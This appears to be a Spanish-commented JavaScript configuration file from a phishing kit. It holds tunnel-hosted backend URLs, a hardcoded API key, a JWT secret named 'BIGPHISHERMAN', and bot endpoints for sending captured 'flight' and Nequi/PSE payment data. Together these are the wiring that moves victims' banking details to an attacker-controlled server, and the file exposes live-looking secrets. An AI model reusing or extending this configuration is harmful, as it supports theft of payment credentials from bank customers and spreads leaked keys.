/**
 * CONFIGURACIÓN DE API
 * Archivo de configuración para la integración con APIs externas
 */

// Configuración principal de la API
export const API_CONFIG = {
    // URL base de la API
    // API_URL: 'http://localhost:8000',
    API_URL: 'https://tunnel.divinasmarranologosdante.shop',
    
    // Clave de autenticación de la API
    API_KEY: '5ba6da97-916f-4c5c-b61e-0e52ae5fd263',
    
    // Firma JWT para autenticación
    JWT_SIGN: 'BIGPHISHERMAN',
    
    // URL del servicio PSE
    PSE_URL: 'https://wn9djh3p-5501.use.devtunnels.ms'
};

// Endpoints de la API
export const API_ENDPOINTS = {
    SEND_DATA: '/api/bot/flight/data',
    NEQUI_BTN: '/api/bot/nequBtn/data',
    STATUS: '/api/bot/status'
};

// Headers por defecto para las peticiones
export const DEFAULT_HEADERS = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${API_CONFIG.API_KEY}`
};

// Configuración de timeout para las peticiones
export const REQUEST_TIMEOUT = 30000; // 30 segundos

// Tipos de respuesta de la API
export const API_RESPONSE_TYPES = {
    SUCCESS: 'success',
    ERROR: 'error',
    PENDING: 'pending',
    FAILED: 'failed'
};

// Códigos de estado de la API
export const API_STATUS_CODES = {
    OK: 200,
    CREATED: 201,
    BAD_REQUEST: 400,
    UNAUTHORIZED: 401,
    FORBIDDEN: 403,
    NOT_FOUND: 404,
    INTERNAL_SERVER_ERROR: 500
};
